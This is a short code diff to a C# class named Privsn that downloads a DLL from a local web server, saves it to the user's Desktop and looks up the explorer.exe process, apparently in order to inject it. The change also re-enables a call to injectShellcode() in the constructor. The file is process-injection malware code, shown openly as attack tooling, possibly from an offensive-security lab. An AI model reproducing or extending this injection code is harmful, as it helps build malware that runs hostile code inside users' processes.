@@ -2,7 +2,7 @@ using System.Diagnostics;
 using System;
 using System.Runtime.InteropServices;
 
-namespace Cevsn
+namespace cevsn
 {
     public class Privsn
     {
@@ -106,7 +106,7 @@ namespace Cevsn
 
         public Privsn()
         {
-            //injectShellcode();
+            injectShellcode();
             injectDLL();
         }
 
@@ -144,8 +144,8 @@ namespace Cevsn
             byte[] dll = client.GetByteArrayAsync("http://localhost:8080/cevsn.dll").Result;
 
 
-            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-            String dllName = dir + "\\cevsn.dll";
+            String dir = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            String dllName = dir + "\\devsn.dll";
 
             Process[] expProc = Process.GetProcessesByName("explorer");
             uint pid = Convert.ToUInt32(expProc[0].Id);
